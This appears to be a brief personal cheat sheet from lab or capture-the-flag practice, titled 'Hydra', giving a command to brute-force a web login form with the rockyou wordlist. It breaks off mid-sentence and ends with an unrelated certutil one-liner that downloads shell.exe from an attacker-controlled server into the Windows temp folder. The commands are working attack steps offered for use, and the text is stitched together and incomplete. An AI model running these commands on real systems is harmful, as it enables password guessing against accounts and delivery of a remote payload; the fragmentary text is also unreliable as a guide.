# Hydra

> Shahrukh Tramboo | February 13th, 2022

--------------------------------------

**Commands**

1.	form-post-data:
```bash
hydra -l amdin -P /usr/share/wordlists/rockyou.txt 10.10.56.204 http-post-form <request-url with all params:params:Login Failed> -t 64
```
-t → Number of tasks that can run in parallel.

Login Failed -> When someone enters wrong credentials

This requires three arguments separated by a colon which may not be null:

Certutil -urlcache -f http://10.17.39.185:8000/shell.exe C:/Windows/Temp/shell.exe
